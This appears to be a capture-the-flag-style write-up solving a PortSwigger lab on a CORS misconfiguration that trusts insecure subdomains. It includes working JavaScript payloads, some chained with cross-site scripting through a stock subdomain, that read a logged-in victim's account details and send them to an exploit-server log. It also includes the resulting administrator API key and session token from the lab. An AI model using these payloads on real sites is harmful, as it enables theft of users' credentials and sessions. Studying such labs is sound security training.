# CORS vulnerability with trusted insecure protocols

## This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all subdomains regardless of the protocol.

## To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

## You can log in to your own account using the following credentials: `wiener:peter`

### HINT:

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open(
    "get",
    "https://YOUR-LAB-ID.web-security-academy.net/accountDetails",
    true
  );
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location =
      "https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=" +
      this.responseText;
  }
</script>
```

### HINT:

```html
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();
	function reqListener() {
	location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText;
	};
%3c/script>
```

---

### step 1

login in and go account section
see history in burpsuite select account-details and sent to repeater
got to home choose any product then click on stock you will get another url with different subdoamin name
`http://stock.0aed003d0361c2148095a4e800e300ff.web-security-academy.net/?productId=4<#HINT>&storeId=1`

### step2

add `Origin: http://stock.0aed003d0361c2148095a4e800e300ff.web-security-academy.net/?productId=1&storeId=1`
you will get response
`Access-Control-Allow-Origin: http://stock.0aed003d0361c2148095a4e800e300ff.web-security-academy.net/?productId=1&storeId=1`

### step3 apply payload in expolit section

### HINT:

```html
<script>
  document.location =
    "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
</script>
```

```subdomain_url
http://stock.0aed003d0361c2148095a4e800e300ff.web-security-academy.net/?productId=4&storeId=1
```

```html
<script>
  document.location =
    "http://stock.0aed003d0361c2148095a4e800e300ff.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aed003d0361c2148095a4e800e300ff.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a27006c0380c2168057a36c01e300d2.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
</script>
```

deliver to victim

go to expolit log section

```javascript
{%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22ISPlm6GR5xNWobDqdasO99acigUDWktd%22,%20%20%22sessions%22:%20[%20%20%20%20%22O84JikMdp0tkYOpx4RrVXrfZYW6JnGIo%22%20%20]}
```

decoded as url in burpsuite

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "ISPlm6GR5xNWobDqdasO99acigUDWktd",
  "sessions": ["O84JikMdp0tkYOpx4RrVXrfZYW6JnGIo"]
}
```
